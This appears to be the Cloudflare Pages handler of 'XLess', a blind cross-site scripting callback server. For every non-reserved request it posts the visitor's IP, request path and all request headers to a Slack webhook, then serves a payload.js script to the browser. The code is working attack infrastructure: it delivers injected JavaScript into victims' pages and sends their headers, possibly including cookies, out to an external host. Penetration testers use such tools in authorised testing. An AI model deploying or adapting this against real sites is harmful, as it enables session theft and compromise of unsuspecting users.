export async function onRequest(context) {
  const { request, env } = context;
  const url = new URL(request.url);
  
  const reserved = ["/c", "/health", "/examples", "/message", "/payload.js"];
  if (reserved.includes(url.pathname)) {
    return context.next();
  }

  const ip = request.headers.get("cf-connecting-ip") || request.headers.get("x-forwarded-for") || "Unknown";
  let alert = "*XSSless: Out-of-Band Callback Alert*\n";
  alert += `• *IP Address:* \`${ip}\`\n`;
  alert += `• *Request URI:* \`${url.pathname}\`\n`;

  for (const [key, value] of request.headers.entries()) {
    alert += `• *${key}:* \`${value}\`\n`;
  }

  if (env.SLACK_INCOMING_WEBHOOK) {
    try {
      await fetch(env.SLACK_INCOMING_WEBHOOK, {
        method: "POST",
        body: JSON.stringify({
          username: "XLess",
          text: alert,
          mrkdwn: true
        })
      });
    } catch (e) {
      console.error("Slack alert failed:", e);
    }
  }

  // Fetch payload.js from the same origin (static assets)
  const payloadUrl = new URL("/payload.js", request.url);
  const payloadResponse = await fetch(payloadUrl);
  return new Response(await payloadResponse.text(), {
    headers: { "Content-Type": "application/javascript" }
  });
}
